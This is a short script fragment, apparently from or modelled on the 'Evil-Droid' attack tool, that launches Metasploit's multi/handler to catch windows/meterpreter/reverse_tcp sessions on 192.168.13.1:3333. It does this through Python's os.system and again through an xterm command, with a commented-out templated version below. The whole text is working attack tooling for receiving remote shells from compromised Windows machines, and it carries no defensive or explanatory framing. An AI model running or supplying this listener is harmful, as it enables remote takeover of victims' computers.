import os
a = "msfconsole -x 'use multi/handler; set LHOST 192.168.13.1; set LPORT 3333; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
os.system(a)

xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST 192.168.13.1; set LPORT 3333; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"

#xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
